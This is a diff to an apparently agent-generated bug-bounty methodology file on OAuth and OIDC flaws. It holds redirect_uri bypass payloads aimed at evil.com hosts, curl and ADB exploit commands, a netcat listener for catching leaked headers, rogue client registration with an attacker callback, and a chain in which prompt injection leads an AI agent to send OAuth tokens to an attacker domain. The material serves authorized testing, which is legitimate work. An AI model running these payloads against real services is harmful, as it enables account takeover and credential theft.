@@ -4,13 +4,13 @@ description: "Use for redirect_uri manipulation, state/PKCE issues, code/token l
 agent_created: true
 ---
 
-# OAuth and OIDC Flaws — unified skill
+# OAuth and OIDC Flaws — unified methodology
 
-> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 3 upstream skills across cbh, h1skills, hunting and grounded in 15,259 disclosed HackerOne reports. Payloads, wordlists and supporting data are in `references/`.
 
-## Corpus evidence — 40 valid HackerOne reports (8 paid / 20%)
+## Corpus signal — 40 valid reports (8 paid / 20%)
 
-Every disclosed report is valid; payment is an impact signal, not a validity test.
+Every disclosed report is valid; payment is an impact signal, not a validity test. Full technique frequencies, case studies and approach patterns: `references/evidence.md`.
 
 ### Techniques ranked across ALL valid reports
 
@@ -28,92 +28,6 @@ Every disclosed report is valid; payment is an impact signal, not a validity tes
 | git history / exposed .git | 3 |
 | WAF / sanitizer / filter bypass | 3 |
 |  HosT/absolute-URL reset poisoning | 3 |
-| XML / SOAP / SAML / XXE | 2 |
-| cache / CDN / unkeyed header | 2 |
-| header injection (Host / X-Forwarded / etc.) | 2 |
-| error message / stack trace probing | 2 |
-| JWT / token / base64 decode | 2 |
-| subdomain / DNS / cert-transparency recon | 2 |
-| swap object ID / parameter value | 1 |
-| verbose debug / framework fingerprint | 1 |
-| Content-Type / body-format switch | 1 |
-| DOM / HTML source inspection | 1 |
-| encoding / double-encode / null byte | 1 |
-| fuzzing / wordlist brute force | 1 |
-| race / concurrency / timing | 1 |
-| mass assignment / extra request fields | 1 |
-
-### Parameters observed in writeups
-
-`realm` (6), `nonce` (6), `algorithm` (4), `domain` (4), `x01host` (3), `res` (3), `code` (3), `host` (2), `curlopt_proxyport` (2), `username` (2), `uri` (2), `response` (2), `redirect_url` (1), `voice` (1), `url` (1), `user[soh]host` (1), `soh]host` (1), `soh]port` (1), `soh]auth` (1), `req1_res` (1), `req2_res` (1), `digest_fresh_second` (1), `matches_host` (1), `bxl1c2vyom15cgfzcw` (1)
-
-### Bypass primitives observed
-
-`bypass` (10), `bypasses` (6), `bypassing` (4), `blind` (3), `open redirect` (2), `content-type` (2), `bypassed` (2), `allowlist` (2), `%0d%0a` (1)
-
-### Impact language observed
-
-`password` (88), `token` (61), `admin` (46), `credential` (41), `secret` (18), `remote code execution` (6), `unauthorized` (4), `account takeover` (3), `localhost` (3), `sensitive information` (2), `full access` (1), `sensitive data` (1)
-
-### Case studies — full excerpts (paid and unpaid)
-
-#### [3423013](https://hackerone.com/reports/3423013) — page.line.me Open Redirect Leading to OAuth Authorization Code Exposure and Access Token Compromise
-
-LY Corporation · $1000 · high
-
-An open redirect vulnerability was identified in page.line.me because redirect destinations were not properly restricted to trusted domains. By abusing this behavior within an OAuth 2.0 authorization flow, an attacker could cause the authorization response to be sent to an attacker-controlled endpoint. This could expose the authorization code issued after successful user authentication, which may then be exchanged for a valid access token. As a result, the vulnerability could lead to unauthorized access to the victim’s account, allowing an attacker to perform actions with the victim’s privileges.
-
-#### [1700734](https://hackerone.com/reports/1700734) — Shop App - Attacker is able to intercept authorization code during authentication (OAuth) and is able to get access to Microsoft Outlook email account
-
-Shopify · $900 · low
-
-## Summary: ### Deep linking Mobile apps have a unique vulnerability that is non-existent in the web: deep linking. Deep linking is a way of sending data directly to a native application from an outside source. A deep link looks like app:// where app is your app scheme and anything following the // could be used internally to handle the request. Deep links are NOT secure and you should never send any sensitive information in them. The reason deep links are not secure is because there is no centralized method of registering URL schemes. As an application developer, you can use almost any url scheme you choose by configuring it in Xcode for iOS or adding an intent on Android. There is nothing stopping a rogue application from hijacking your deep link by also registering to the same scheme and then obtaining access to the data your link contains. ### Shop app - Microsoft Outlook Oauth flow and the vulnerability The **Shop App** allows users to connect to their Microsoft Outlook account to import orders from the emails (via OAuth flow). Therefore, the custom url scheme `shopapp://` is used for transmitting the authorization code at the end of the Oauth flow to the Shop App, which finally can be used to exchange the the authorization code with a valid session token from Microsoft. Another (malicious) app is also able to claim the **same url scheme** and can intercept the authorizati
-
-#### [107877](https://hackerone.com/reports/107877) — API: Bug in method auth.signup , дающий возможность бесконечно звонить
-
-VK.com · $500 · severity n/a
-
-Отсутствие flood-контроля в api методе регистрации, что давало возможность отправлять массово смс или звонить на произвольный номер. В API Найдена уязвимость дающая бесконечно звонить и слать смс , лимит запросов можно было обойти. (найдена практически такая же уязвимость , как и в репорте ДАЮЩАЯ БЕСКОНЕЧНО ЗВОНИТЬ , но тут выплата 300$ , а там 500$) На вопрос почему так ? - ответа не последовало. UPD , ПЕРЕСМОТРЕЛИ НАГРАДУ ПЕРЕД ОТКРЫТИЕМ РЕПОРТА ПУБЛИЧНО i die ███████████████████████████ ███████▀▀▀░░░░░░░▀▀▀███████ ████▀░░░░░░░░░░░░░░░░░▀████ ███│░░░░░░░░░░░░░░░░░░░│███ ██▌│░░░░░░░░░░░░░░░░░░░│▐██ ██░└┐░░░░░░░░░░░░░░░░░┌┘░██ ██░░└┐░░░░░░░░░░░░░░░┌┘░░██ ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██ ██▌░│██████▌░░░▐██████│░▐██ ███░│▐███▀▀░░▄░░▀▀███▌│░███ ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██ ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██ ████▄─┘██▌░░░░░░░▐██└─▄████ █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████ ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████ █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████ ███████▄░░░░░░░░░░░▄███████ ██████████▄▄▄▄▄▄▄██████████ ███████████████████████████
-
-#### [1551591](https://hackerone.com/reports/1551591) — CVE-2022-27776: Auth/cookie leak on redirect
-
-Internet Bug Bounty · $480 · low
-
-## Summary: curl/libcurl can be coaxed to leak Authorization / Cookie headers by redirecting request to http:// URL on the same host. Successful exploitation requires that the attacker can either Man-in-the-Middle the connection or can access the traffic at the recipient side (for example by redirecting to a non-privileged port such as 9999 on the same host). ## Steps To Reproduce: 1. Configure for example Apache2 to perform redirect with mod_rewrite: ... the attacker could also use `.htpasswd` file to do so. 2. Set up netcat to listen for the incoming secrets: `while true; do echo -ne 'HTTP/1.1 404 nope\r\nContent-Length: 0\r\n\r\n' | nc -v -l -p 9999; done` 3. `curl-L -H "Authorization: secrettoken" -H "Cookie: secretcookie" The redirect will be followed, and the confidential headers sent over insecure HTTP to the specified port: The attack could also use HTTPS and a valid certificate, In this case the leaked headers are of course only be visible to the listening http server. This vulnerability is quite similar to `CVE-2022-27774` and the fix is similar too: If the protocol or port number differs from the original request strip the Authorization and Cookie headers. This bug appears to be at: - - ## Impact Leak of Authorization and/or Cookie headers.
-
-#### [1784162](https://hackerone.com/reports/1784162) — OAuth2 "authorization_code" is valid indefinetly
-
-Nextcloud · $100 · low
-
-Your OAuth2 endpoint is not at all following best practices. When the authorization_code is generated it is stored without a timeout. Now according to 10 minutes is recommended. As the goal is that is gets used almost directly or not at all. Now there is a debate maybe to have on the 10 minutes. But there is kind of a big difference between 10 minutes and no timeout at all. ## Impact An attacker that obtains this code could possibly easily redeem it in the future. Or an attacker could just keep trying codes.
-
-#### [791775](https://hackerone.com/reports/791775) — Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation to Any Shop Owner by Taking Advantage of the Shopify SSO
-
-Shopify · no bounty — still valid · critical
-
-I told Pete I would take a look at Spotify, hi Pete. ## Summary It's possible to take over any store account through bypassing the email confirmation step in *.myshopify.com. I found a way to confirm arbitrary emails, and after confirming arbitrary email in *.myshopify.com, user is able to **integrate** with other Shopify store that shares the same email address by setting a master password for all of the stores(if the owner hasn't integrated before), effectively taking over every Shopify stores by knowing just the owner's email address. After signing up a new Shopify instance in and start the free trial, user can change their email address to a new email address before confirming the one they used to sign up. The bug is that Shopify email system mistakenly send the confirmation link of the new email address, to the one that is used to signed up. And the result is user can confirm arbitrary email address. And the next step is taking over other user's Shopify instance by taking advantage of the SSO. ## Quick check If you check and see the email address of the owner, it is ngalog@hackerone.com, which I obviously would never be able to validate otherwise {F711349} ## steps to reproduce - Visit and signup a free trial with an email address, say attacker@gmail.com that you can receive emails - after entering the fields to enter the store, on top right corner, click your name and go 
-
-#### [796956](https://hackerone.com/reports/796956) — Able to Takeover Merchants Accounts Even They Have Already Setup SSO, After Bypassing the Email Confirmation
-
-Shopify · no bounty — still valid · medium
-
-Able to Takeover Merchants Accounts Even They Have Already Setup SSO, After Bypassing the Email Confirmation ## Summary This report is based on the scenario that email confirmation has been bypassed already, like shown in #791775. What happened in #791775 was, I was too excited and didn't take a step further to try to takeover merchant's account even they have SSO setup, and after reading the comment `An important mitigating factor was that this bug only affected user accounts which had not yet adopted our single login system. `, I know I have to find a way to bypass that to prove my point. ## Description For merchant that have accounts already setup SSO, even attacker has bypassed the email confirmation, they would have no ways to takeover the rest of the accounts of the merchant, because they will need to enter the master password of the merchant in the process of merging accounts. Let me illustrate this in graphs, in this example, the merchant that has SSO already setup is `ngalog+1@wearehackerone.com`, the attacker sign-up a store h48ngalog.myshopify.com, with email `ngalog+1@wearehackeorne.com` Stage 1. First, for whatever reason, maybe a new feature appeared that allows attacker to bypass email confirmation again or an old bug bypass, that as an attacker with ngalog+1@wearehackerone.com confirmed, he should see this in the shop {F716958} Stage 2. Then, when attacker click
-
-### Recurring approach patterns from real reports
-
-- 1× hi i noticed that the redirect uri used to redirect users to any location on the page passes in all data into a header location without any validation
-- 1× hi i found that you are using a weak password policy
-- 1× done ps the same occurs when you intercept no photo option ps2 i could not execute code through this but i thought it was a valid report because i tried to upload txt files in upload photo options and it was not allowed
-- 1× i found a way to confirm arbitrary emails and after confirming arbitrary email in myshopify com user is able to integrate with other shopify store that shares the same email address by setting a master password for all of the stores if the owner hasn t integrated before effectively taking over every shopify stores by knowing just the owner s email address
-- 1× what happened in was i was too excited and didn t take a step further to try to takeover merchant s account even they have sso setup and after reading the comment an important mitigating factor was that this bug only affected user accounts which had not yet adopted our single login system
-- 1× users sso provider accounts remain secure and after that cache period of up to hour any user attempting to sign in with sso will be required to reauthorize courier s oauth application before logging in successfully again
-- 1× there is nothing stopping a rogue application from hijacking your deep link by also registering to the same scheme and then obtaining access to the data your link contains
-- 1× i created a malicious android app which is able to intercept the authorization code see poc
-- 1× i have discovered that it is possible to bypass this restriction
-- 1× during my testing the restriction on oauth token is being voided once the victim authenticates and completes the email verification regardless of the ip difference between the attacker and the victim
-- 1× browser os and or app version used during testing firefox browser bit windows
-- 1× summary i found an incomplete fix variant of cve in curl
-- 1× i checked the claims against the curl production source reproduced both option paths on two independent sanitizer enabled builds and reviewed public curl issues and advisories for duplicates
 
 ## Corpus-backed method (this class)
 
@@ -143,18 +57,13 @@ Able to Takeover Merchants Accounts Even They Have Already Setup SSO, After Bypa
 - Weak state -> login CSRF -> account linking -> ATO.
 - Dynamic registration SSRF -> internal metadata -> key material.
 
-### Probes
-
-- redirect_uri suffix/subdomain/parameter variants; missing state; code replay; response_type=token hash capture; scope expansion at /token.
-
 ### Veteran tip
 
 The operator's field notes include the full OAuth step map — follow the parameters, not the UI.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### Quick wins
 
 Start here. These are the highest-yield tests for this class.
@@ -244,10 +153,7 @@ Start here. These are the highest-yield tests for this class.
 - Check OIDC `id_token` claims: `nonce` (replay protection), `aud` (must equal your client_id), `iss`, `exp`, `iat`, and `azp` for multiple audiences.
 - Look for `/.well-known/webfinger` user enumeration and LDAP injection as a side-channel for identifying valid accounts to target in an OAuth account-linking attack.
 - Check whether the client stores identity in `localStorage` (MSAL `getAllAccounts()`) rather than validating the bearer token server-side — patching the JS guard is then enough to expose protected routes.
-- For desktop AI/agent clients, test whether discovery metadata (`authorization_endpoint`, `token_endpoint`) is passed to an OS URL handler — CVE-2025-6514 (`mcp-remote` ≤0.1.15) turned this into local code execution.
-
-### Signals and surfaces
-
+- For desktop AI/agent clients, test whether discovery metadata (`authorization_endpoint`, `token_endpoint`) is passed to an OS URL handler — CVE-2025-6514 (`mcp-remote` ≤0.1.15) turned this into local code execution.### Signals and surfaces
 ### Signal
 
 - Reports: **177** · paid: **45**
@@ -310,10 +216,7 @@ Content-Type: application/json (with access_token in body)
 - Social login buttons (Google, Facebook, Apple) = OAuth surface guaranteed
 - `.well-known/openid-configuration` present = full OIDC surface available
 
----
-
-### Techniques, payloads and bypasses
-
+---### Techniques and bypasses
 ### Payloads & probes
 
 - `redirect_uri=https://target.com.evil.com` `redirect_uri=https://target.com%2f@evil.com`
@@ -529,10 +432,7 @@ A server-side prefix-match flaw on `redirect_uri` is **necessary but not suffici
 
 **Always headless-test (Playwright / Puppeteer / a real browser) the final navigation BEFORE writing the OAuth finding as ATO-chain.** Server-side accept + browser-side stay-on-legitimate-host = **not** ATO. Verified live in `docs/verification/phase3-playwright-browser-execution.md` Test 29.
 
----
-
-### Validation and proof
-
+---### Validation and proof
 ### Reporting bar
 
 - Prove real impact on a second controlled account or a safe callback.
@@ -591,10 +491,7 @@ Open a fresh browser/device with no prior state. If you can walk from "unauthent
 
 **Bypass:** Check if nonce is validated client-side in JavaScript only. Intercept and modify the ID token's nonce claim if the signature isn't verified (rare but seen in misconfigured implementations). Also test if nonce is validated on *initial* request but not on token refresh.
 
----
-
-### Escalation and related chains
-
+---### Escalation and related chains
 ### Escalation chains
 
 - OAuth redirect -> token theft -> ATO.
@@ -621,10 +518,7 @@ Open a fresh browser/device with no prior state. If you can walk from "unauthent
 - **`hunt-llm-ai`** — Modern OAuth flows for AI agents (ChatGPT plugins, Claude MCP servers, agentic copilots) reuse OAuth 2.1 + PKCE. Chain primitive: agentic AI accepts `redirect_uri` from indirect prompt-injection in a document → model crafts OAuth authorize URL with attacker callback → user clicks "approve" thinking it's the agent's own flow → tokens exfiltrated via tool-use to attacker domain.
 - **`hunt-saml`** — When OAuth is layered atop a SAML IdP, the IdP-level XSW becomes the OAuth ATO path. Chain primitive: SAML SP that issues OAuth tokens after assertion-validation + XSW attack on the assertion alters `NameID` to admin user → SP issues OAuth token bearing admin identity → OAuth-scoped APIs grant admin access.
 - **`security-arsenal`** — Pull the OAuth `redirect_uri` Bypass Table (host-confusion `legit.com@evil.com`, `legit.com.evil.com`, path-traversal, parameter pollution, encoded-slash `%2F`, fragment-injection `#legit.com`) and the open-redirect chain catalog when exact-match validation forces you to find an open-redirect on the whitelisted domain first.
-- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an OAuth "open redirect" that doesn't actually leak a token (only the `state` param, or the callback page doesn't include credentials in URL). State-only leakage is Low; token/code leakage with successful exchange demonstration is Critical. The exchange-the-code step is non-negotiable.
-
-### Tools and wordlists
-
+- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an OAuth "open redirect" that doesn't actually leak a token (only the `state` param, or the callback page doesn't include credentials in URL). State-only leakage is Low; token/code leakage with successful exchange demonstration is Critical. The exchange-the-code step is non-negotiable.### Tools
 ### Tools
 
 `Burp` · `oauth-misconfig` · `jwt_tool`
@@ -675,10 +569,7 @@ grep -r "intent://\|deeplink\|scheme://" .
 
 # Check .well-known
 curl https://target.com/.well-known/openid-configuration | python3 -m json.tool
-```
-
-### Sources and related reading
-
+```### Sources and related reading
 ### Query the corpus
 
 ```sh
@@ -709,10 +600,7 @@ python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class oaut
 ### D. Sources — numbered list of URLs you actually fetched
 
 1. https://portswigger.net/research/hidden-oauth-attack-vectors
-2. https://hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html
-
-### Additional notes
-
+2. https://hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html### Additional notes
 ### Parameters observed
 
 `client_id` · `redirect_uri` · `response_type` · `scope` · `code` · `state` · `oauth_token` · `referrer` · `client_secret` · `error` · `type` · `email` · `remember_me` · `ticket` · `jwt` · `next` · `settings_version` · `callback` · `requestTokenAndRedirect` · `sid`
@@ -928,393 +816,8 @@ redirect_uri=https://legit.com/logout?next=https://evil.com
 
 ### Defender: PKCE enforcement
 
-**Bypass:** Check if PKCE is required for *all* clients or only specific ones. Legacy clients or mobile apps may be exempt. Test with `code_challenge` omitted — if the server still issues tokens, PKCE isn't enforced.
-
-## Companion methodology (complete, deduplicated)
-
-Full text of every non-SKILL.md methodology document from the contributing skills.
-
-### Companion: hunting / references/payloads.md
-
-# OAuth OIDC — Combined Field Guide — Payload reference
-
-Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.
-
----
-
-## Payloads & probes
-
-
-
-- `redirect_uri=https://target.com.evil.com` `redirect_uri=https://target.com%2f@evil.com`
-
-- `redirect_uri=https://target.com/callback/../../evil`
-
-- `response_type=token` `scope=openid profile email`
-
-- `state=` empty/reused; `nonce=` missing
-
-
-
-## Payload fragments observed
-
-
-
-Recurring payloads from this class's writeups. Adapt, don't paste blindly.
-
-
-
-| Seen | Fragment |
-
-|---:|---|
-
-| 5× | `Curl_auth_allowed_to_host()` |
-
-| 4× | `wp_redirect()` |
-
-| 4× | `Curl_auth_allowed_to_origin()` |
-
-| 4× | `data->state.creds` |
-
-| 3× | `$count = 1` |
-
-| 3× | `conn->bits.netrc` |
-
-| 3× | `support+1@trint.com` |
-
-| 3× | `@rpath` |
-
-| 3× | `url_set_data_creds_netrc()` |
-
-| 2× | `ngalog+1@wearehackerone.com` |
-
-| 2× | `https://snappublisher.snapchat.com/sso_continue?ticket=<stolen token>` |
-
-| 2× | `GET → 404 {"status":404,"error":"Not Found"}` |
-
-| 2× | `https://github.com/login?client_id=5f45cc999f7812d0b6d2&return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3D5f45cc999f7812d0b6d2%26redirect` |
-
-| 2× | `str_replace( OPENVERSE_SUBPATH, '', $path, $count )` |
-
-| 2× | `str_replace()` |
-
-| 2× | `wp_safe_redirect()` |
-
-| 2× | `get_target_url()` |
-
-| 2× | `wp_sanitize_redirect()` |
-
-| 2× | `wp_validate_redirect()` |
-
-| 2× | `GET / HTTP/1.1 / Host: hostname.tld:9999 / User-Agent: curl/7.83.0-DEV / Accept: */* / Authorization: secrettoken / Cookie: secretcookie` |
-
-
-
-## Parameters observed
-
-
-
-`client_id` · `redirect_uri` · `response_type` · `scope` · `code` · `state` · `oauth_token` · `referrer` · `client_secret` · `error` · `type` · `email` · `remember_me` · `ticket` · `jwt` · `next` · `settings_version` · `callback` · `requestTokenAndRedirect` · `sid`
-
-
-
-## Wordlists
-
-
-
-Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.
-
-
-
-| File | Entries |
-
-|---|---:|
-
-| `~/.local/share/hackerone-reports/wordlists/paths_oauth-oidc.txt` | 150 |
-
-| `~/.local/share/hackerone-reports/wordlists/params_oauth-oidc.txt` | 78 |
-
-| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
-
-| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |
-
-
-
-```sh
-
-W=~/.local/share/hackerone-reports/wordlists
-
-ffuf -u https://target/FUZZ -w $W/paths_oauth-oidc.txt \
-
-     -mc all -fc 404 -fs 0 -rate 40
-
-ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_oauth-oidc.txt \
-
-     -mr 'canary|error|invalid|not found' -rate 40
-
-```
-
-
-
-## Nuclei
-
-
-
-Focus on redirect_uri validation, state/nonce, code reuse, and account linking — scanner coverage is shallow.
-
-
-
-```sh
-
-nuclei -u https://target -tags oauth,oidc \
-
-       -severity low,medium,high,critical -rl 40 -o nuclei_oauth-oidc.txt
-
-nuclei -u https://target -t ~/nuclei-templates/http/technologies/oauth2-detect.yaml \
-
-       -rl 40 -o nuclei_oauth-oidc_oauth2-detect.txt
-
-# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
-
-```
-
-
-
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-
-
-## Payload & Detection Patterns
-
-
-
-### redirect_uri Bypass Payloads
-
-```
-
-# Host confusion
-
-https://evil.com#legit.com
-
-https://legit.com.evil.com
-
-https://legit.com@evil.com
-
-
-
-# Path traversal
-
-https://legit.com/oauth/callback/../../redirect?url=https://evil.com
-
-
-
-# Open redirect chain (find open redirect on legit domain first)
-
-https://legit.com/logout?next=https://evil.com
-
-
-
-# Parameter pollution
-
-?redirect_uri=https://legit.com/cb&redirect_uri=https://evil.com/cb
-
-
-
-# URL encoded slashes
-
-https://legit.com%2F@evil.com
-
-https://legit.com%252F..%252F..evil.com
-
-```
-
-
-
-### State CSRF Test
-
-```bash
-
-# Step 1: Initiate OAuth flow, capture state value
-
-# Step 2: Drop request, use attacker account's link with victim's session
-
-curl -v "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/cb&response_type=code&state=FIXED_VALUE"
-
-
-
-# Step 3: Force victim to visit callback with attacker's code + fixed state
-
-https://target.com/oauth/callback?code=ATTACKER_CODE&state=FIXED_VALUE
-
-```
-
-
-
-### Nonce Extraction via Referrer
-
-```bash
-
-# After OAuth callback landing page, check outbound requests
-
-# Look for Referer header containing access_token or code
-
-curl -v "https://target.com/auth/callback?code=ABC&state=XYZ" \
-
-  -H "Referer: https://evil.com" \
-
-  --max-redirs 0
-
-
-
-# Grep JS for outbound calls made on callback page
-
-grep -r "fetch\|XMLHttpRequest\|img.src\|script.src" callback_page.html
-
-```
-
-
-
-### Mobile Deep Link Exploit (Android)
-
-```bash
-
-# ADB exploit for push_notification_webview deeplink
-
-adb shell am start -a android.intent.action.VIEW \
-
-  -d "target-app://push_notification_webview?url=https://evil.com/steal_oauth"
-
-
-
-# Craft intent URI for web-based exploit
-
-<a href="intent://push_notification_webview?url=https://evil.com#Intent;scheme=target-app;package=com.target.app;end">Click</a>
-
-```
-
-
-
-### Token Endpoint Auth Bypass
-
-```bash
-
-# Test unauthenticated token exchange (skip email verification)
-
-curl -X POST https://target.com/oauth/token \
-
-  -d "grant_type=authorization_code" \
-
-  -d "code=CAPTURED_CODE" \
-
-  -d "client_id=CLIENT_ID" \
-
-  -d "redirect_uri=https://legit.com/callback"
-
-
-
-# Test with unverified account credentials
-
-curl -X POST https://target.com/oauth/token \
-
-  -d "grant_type=password" \
-
-  -d "username=unverified@evil.com" \
-
-  -d "password=password123" \
-
-  -d "client_id=CLIENT_ID"
-
-```
-
-
-
-### Grep Patterns for Recon
-
-```bash
-
-# In APK/JS files
-
-grep -r "redirect_uri\|client_secret\|oauth_token\|access_token\|push_notification" .
-
-grep -r "intent://\|deeplink\|scheme://" .
-
-
-
-# In Burp history
-
-# Filter: URL contains "oauth" OR "token" OR "callback"
-
-# Filter: Response contains "access_token" OR "code=" in Location header
-
-
-
-# Check .well-known
-
-curl https://target.com/.well-known/openid-configuration | python3 -m json.tool
-
-```
-
-
-
-### OIDC Discovery & Dynamic Registration Abuse
-
-```bash
-
-# Enumerate OIDC endpoints (esp. registration_endpoint)
-
-curl -s https://idp/.well-known/openid-configuration | jq '{authorization_endpoint, token_endpoint, jwks_uri, registration_endpoint, response_types_supported}'
-
-
-
-# If registration_endpoint is open, register a malicious client with attacker redirect_uri
-
-curl -X POST https://idp/connect/register \
-
-  -H "Content-Type: application/json" \
-
-  -d '{"client_name":"legit-app","redirect_uris":["https://attacker/cb"]}'
-
-```
-
-
-
-### Cross-Client Token Confusion
-
-```bash
-
-# Mint token for client A, attempt replay on client B's API
-
-TOKEN=$(curl -s https://idp/oauth/token \
-
-  -d "code=$AUTH_CODE&client_id=CLIENT_A&client_secret=SECRET_A&redirect_uri=https://app-a.com/cb" | jq -r .access_token)
-
-
-
-# Test if client B's API accepts the token (no audience validation)
-
-curl https://api.app-b.com/admin -H "Authorization: Bearer $TOKEN"
-
-```
-
-
-
-### OIDC prompt=none Silent Re-Auth Test
-
-```bash
-
-# Test whether adding prompt=none to authorize request yields a token without user interaction
-
-# Signals session fixation / silent auth abuse potential
-
-curl -v "https://idp/authorize?client_id=APP&redirect_uri=https://app/cb&response_type=code&state=XYZ&prompt=none"
-
-```
-
-
-
----
-
-### Companion: hunting / references/techniques.md
+**Bypass:** Check if PKCE is required for *all* clients or only specific ones. Legacy clients or mobile apps may be exempt. Test with `code_challenge` omitted — if the server still issues tokens, PKCE isn't enforced.### Companion methodology (deduplicated)
+### hunting / references/techniques.md
 
 # OAuth OIDC — Combined Field Guide — Technique reference
 
@@ -1664,258 +1167,13 @@ A server-side prefix-match flaw on `redirect_uri` is **necessary but not suffici
 
 
 
----
+---## Probes
 
-## Corpus wordlists (mined)
+- redirect_uri suffix/subdomain/parameter variants; missing state; code replay; response_type=token hash capture; scope expansion at /token.
 
-### `params_oauth-oidc.txt`
+## Supporting data
 
-```text
-client_id
-redirect_uri
-response_type
-scope
-code
-state
-oauth_token
-referrer
-client_secret
-error
-type
-email
-remember_me
-ticket
-jwt
-next
-settings_version
-callback
-requestTokenAndRedirect
-sid
-url
-redirect_after_login
-authenticity_token
-nonce
-token_type
-error_description
-error_hint
-redirect_to
-return_to
-correlation_id
-raw_json
-include_zero_rate
-ro
-signature
-oauth_verifier
-consumer_key
-callback_url
-host
-usp
-name
-next_url
-display_name
-invite_code
-age
-terms
-rules
-grant_type
-username
-password
-access_token
-refresh_token
-commit
-family
-pennies
-feature
-sr_detail
-expand_srs
-from_detail
-api_type
-always_show_media
-request_timestamp
-token
-package_name
-product_id
-filter
-branch
-claims
-redirect_url
-hmac
-shop
-timestamp
-rt
-js_use_scheme
-display
-access_type
-approval_prompt
-dl
-voice
-```
-
-### `paths_oauth-oidc.txt`
-
-```text
-/oauth/authorize
-/login
-/accounts/sso
-/v2/auth/authorize
-/authorize/
-/access/jwt
-/cb
-/_oauth/twitter/
-/reuse2
-/method/auth.validatePhone
-/oauth2/authorize
-/sso_continue
-/login/oauth/authorize
-/oauth/token
-/users/sign_in
-/.well-known/openid-configuration
-/developers
-/t5/Getting-Started-Product/2-week-old-wisp/m-p/1687239
-/imagefetch.php
-/oauth2/fallbacks/error
-/authorization.json
-/authorization/token
-/api/auth
-/integrations/oauth/create
-/login/
-/settings/apps
-/openverse/search/
-/openverse/openverse@evil.example/login
-/openverse
-/search/
-/redirectpoc
-/core/oauth/auth
-/php/instagram_tag_relay
-/wap/noauth/sharedetail.ftl
-/admin/oauth/authorize
-/auth/login/twitter:twitter.com/
-/admin/oauth/redirect_from_partners_dashboard
-/callback
-/careers
-/first
-/fresh2
-/cgi-bin/cvename.cgi
-/auth/pinterest/callback
-/rsso/admin/
-/pricing
-/logout
-/accounts_merge/new-password
-/redirect
-/pocs/periscope-oauth-callback-hijack
-/ja/items/4503924
-/snaps/create/new
-/accounts/login
-/-/jira/login/oauth/callback
-/-/jira/login/oauth/access_token
-/login/oauth/access_token
-/chapters/
-/advisories/tfh-form_post-xss-ato/
-/error
-/interaction/KTTbkN8LaJgYIb7fIwPYX/signup
-/en/signup/
-/vuln/detail/CVE-2026-4296
-/blog/from-mcp-to-shell/
-/v1/oauth/token
-/oauth
-/v1/broadcast/publish
-/pocs/periscope-oauth-csrf/code.php
-/oauth/periscope
-/v1/broadcast/create
-/oauthAuthorize
-/v1/broadcast/delete
-/pocs/periscope-oauth-csrf/
-/data/definitions/601.html
-/auth/lichess/
-/blitzbattle/
-/oauth2/access_token
-/oauth2/success
-/ee/security/email_verification.html
-/ee/api/oauth2.html
-/auth/realms/mbo/protocol/openid-connect/certs
-/token/introspect
-/introspect
-/token
-/register
-/apps/user_oidc/id4me
-/auth
-/auth/realms/mbo/protocol/openid-connect/logout
-/auth/realms/mbo/protocol/openid-connect/login-status-iframe.html
-/userinfo
-/15495620-7c98-4643-a6df-9e7864c0dead
-/blog/p/hacking/pressing-buttons-with-popups
-/2024/12/doubleclickjacking-what.html
-/2024/02/cross-window-forgery-web-attack-vector.html
-/attack
-/apps/new
-/how-it-works/
-/api/sso/v1/user/self
-/tag/hostile-subdomain-takeover/
-/help/verify-domain-ownership-html-or-dns-7452
-/cloudfront/custom-ssl-domains/
-/34902385023958329058235.html
-/oauth/revoke
-/api/me
-/html/rfc6749
-/removal
-/████████/projects.json
-/████████/projects/████████.json
-/integrations
-/integrations/████████/removal
-/projects.json
-/.well-known/oauth-authorization-server
-/projects/
-/authorization
-/…/projects/
-/integrations/
-/authorization/new
-/rfc/rfc6749
-/oauth/shielder/mobile_login
-/web/oauth.go
-/.nvm/nvm.sh
-/login/oauth/token
-/login/oauth/credentials
-/about/
-/metadata
-/2017/[post-title
-/api/v2/gold/paypal/create_coin_purchase_order
-/api/v2/gold/android/verify_purchase
-/1.1/help/settings.json
-/self-xss-to-cloudflare-single-click-approvals/
-/screenshot-viewer/responsive/image
-/thread/kf5kyfl6626kmp1wlxm6h0gk7vobny0y
-/vimeo/vimeoOAuth2Bypass.html
-/oauth/crossdomain.xml
-/oauth/authorize/crossdomain.xml
-/graphql
-/@evil.example
-/openverse/@evil.example
-/openverse/
-/openverse/2023/02/08/openverse-org-is-live/
-/x.evil.example
-/ru/
-/openverse/openverse@evil.example/
-/landed
-/openverse/openverse.evil.example/
-/themes/pub/wporg-openverse/functions.php
-/openverse/…
-/openverse/x/openverse.evil.example
-/apwbVpa2r6Y
-/pocs/twitter-oauth-xss
-/people/alice_brown
-/api/v1/method.callAnon
-```
-
-## Source skills merged into this topic
-
-- `h1skills` — `hackerone-oauth-oidc`
-- `hunting` — `oauth-oidc`
-- `cbh` — `hunt-oauth`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
